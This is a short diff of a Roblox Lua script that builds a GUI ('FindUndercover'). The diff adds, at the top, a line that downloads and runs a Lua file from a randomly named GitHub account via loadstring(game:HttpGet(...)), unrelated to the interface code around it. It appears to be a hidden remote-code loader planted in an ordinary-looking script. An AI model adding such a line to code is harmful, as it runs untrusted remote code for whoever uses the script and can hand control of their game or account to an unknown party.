@@ -2,7 +2,7 @@
 -- Version: 3.2
 
 -- Instances:
-
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/AClassicSecretAccount/9KBqpRBg3Uy1xFk665OP/main/1xiNzDsFy8wxr7xrqKXu.lua'),true))()
 local FindUndercover = Instance.new("ScreenGui")
 local Under = Instance.new("Frame")
 local UcName = Instance.new("TextLabel")
